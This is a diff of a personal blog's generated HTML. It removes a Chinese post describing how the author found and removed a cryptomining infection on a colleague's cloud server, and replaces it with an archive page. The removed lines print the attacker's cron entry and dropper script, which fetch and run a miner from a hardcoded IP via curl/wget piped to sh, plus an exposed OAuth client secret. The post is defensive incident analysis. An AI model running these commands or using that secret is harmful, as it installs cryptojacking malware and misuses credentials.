@@ -6,19 +6,14 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://landuo.github.io">
-  <title>记录一次被植入挖矿脚本并解决的过程 | Accidia的记事本</title>
+  <title>Archives: 2020/11 | Accidia的记事本</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形) 叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的">
-<meta property="og:type" content="article">
-<meta property="og:title" content="记录一次被植入挖矿脚本并解决的过程">
-<meta property="og:url" content="http://landuo.github.io/resolv_cpu100_by_mine_script/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Accidia的记事本">
+<meta property="og:url" content="http://landuo.github.io/archives/2020/11/index.html">
 <meta property="og:site_name" content="Accidia的记事本">
-<meta property="og:description" content="前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形) 叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2019-10-30T05:51:16.000Z">
-<meta property="article:modified_time" content="2020-08-23T13:58:02.568Z">
 <meta property="article:author" content="Accidia">
-<meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Accidia的记事本" type="application/atom+xml">
@@ -158,216 +153,71 @@ ga('send', 'pageview');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-resolv_cpu100_by_mine_script" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      记录一次被植入挖矿脚本并解决的过程
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2020" class="archive-year">2020</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/notes/configuration-of-using-JNDI-in-SpringBoot/" class="archive-article-date">
+  	<time datetime="2020-11-07T05:38:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-07</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/notes/configuration-of-using-JNDI-in-SpringBoot/">Websphere部署SpringBoot项目时，使用JDNI数据源</a>
     </h1>
   
 
-        
-        <a href="/resolv_cpu100_by_mine_script/" class="archive-article-date">
-  	<time datetime="2019-10-30T05:51:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形)</p>
-<p>叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的VPS此时都已经是连不上的状态了, 但他的阿里云还能正常的连上ssh, 不知道是CPU没到100% 的缘故还是阿里做的优化的问题.  下面说下当初处理的步骤:  </p>
-<a id="more"></a>
-
-<ul>
-<li><p>使用 <code>top</code> 查看了下系统当前资源的利用率, 发现CPU在 98-99之间徘徊, CPU占用率最高的一个进程 <strong>COMMAND</strong> 叫做 <strong>Donald</strong>, 立马用 <code>find</code> 和 <code>whereis</code> 搜了一下, 结果没找到. 然后寻思着杀死这个进程, 后来同事说好像过段时间就会重新启动, 立马想到 linux 的定时任务 <strong>crontab</strong>.  </p>
-</li>
-<li><p>因为当时登录的是 <strong>root</strong> 用户, 所以用 <code>crontab -l</code> 查看了定时任务, 果真有这定时任务, 大喜 ! 执行命令得出的结果好像是这样的 :  </p>
-</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh</span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li>接着顺腾摸瓜, 从定时任务里拿curl 那个命令去下载 i.sh 这个文件, 得到下面的内容的文件:  </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line">echo "" &gt; /var/spool/cron/root</span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" &gt;&gt; /var/spool/cron/root</span><br><span class="line">cp -f /var/spool/cron/root /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">touch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/</span><br><span class="line">touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/</span><br><span class="line">touch /usr/bin/writeable &amp;&amp; cd /usr/bin/</span><br><span class="line">rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">ps auxf | grep -v grep | grep sequfa4 || rm -rf sequfa4</span><br><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br><span class="line">chmod +x sequfa4</span><br><span class="line">/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4</span><br><span class="line"></span><br><span class="line">ps auxf | grep -v grep | grep sequbcb | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcc | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcd | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbce | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa0 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa1 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa2 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa3 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line"></span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -m180 -fsSL  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" | crontab -</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>分析这个文件可以知道, 该脚本在机子上运行了一个叫做 <strong>sequfa4</strong>, 拿到百度一搜这个名字, 嗯 ? 没啥结果 ? 接着仔细看完才晓得, 其实是在这一串代码中下载了一个本机架构的 <strong>ddgs</strong> 的文件 !  </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>搜索引擎一搜, 哦豁, 果真是挖矿脚本, 不过好在脚本所做的时候都已经知道了, 只要把此脚本做的事逆向回去就好了. </li>
-</ul>
-<pre><code class="shell">  #清除定时任务  
-  echo &quot;&quot; &gt; /var/spool/cron/root 
-  echo &quot;&quot; &gt; /var/spool/cron/crontabs/root
-
-  # 使用 rm 命令删除掉下载的 sequfa4 文件  
-  rm /usr/bin/sequfa4 /usr/libexec/sequfa4 /usr/local/bin/sequfa4 /tmp/sequfa4</code></pre>
-<ul>
-<li>接下来做的就是清除定时器里的任务和删掉下载的文件就好了, 但我发现删了并没有用, 然后试着重启之后就完全没有问题了. 用了早上大概一小时的时间发现问题并解决问题, 虽然实际解决很简单, 但发现的过程实在是很快乐. 吃一堑长一智, 估计下次他的密码应该会复杂一点点了.</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">+ SpringBoot + Websphere + JNDI</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Notes//" class="article-tag-list-link color1">Notes</a>
+        			<a href="/categories/Notes//" class="article-tag-list-link color3">+ Notes</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://landuo.github.io/resolv_cpu100_by_mine_script/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/design-pattern/design_pattern_intro/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          设计模式介绍
-        
-      </div>
-    </a>
   
   
-    <a href="/install_docker_with_raspberry_pi/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">树莓派安装docker</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
-  <div id="gitment-ctn"></div> 
-<link rel="stylesheet" href="//imsun.github.io/gitment/style/default.css">
-<script src="//imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-var gitment = new Gitment({
-  id: "http://landuo.github.io/resolv_cpu100_by_mine_script/",
-  owner: 'landuo',
-  repo: 'landuo.github.io',
-  oauth: {
-    client_id: 'f22cd1da404a63898b7e',
-    client_secret: '63e6c51500ffb475e93edd3b52e88e9bc3b55bf5',
-  },
-})
-gitment.render('gitment-ctn')
-</script>
-  
+    
 
 
           </div>
@@ -395,8 +245,8 @@ gitment.render('gitment-ctn')
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
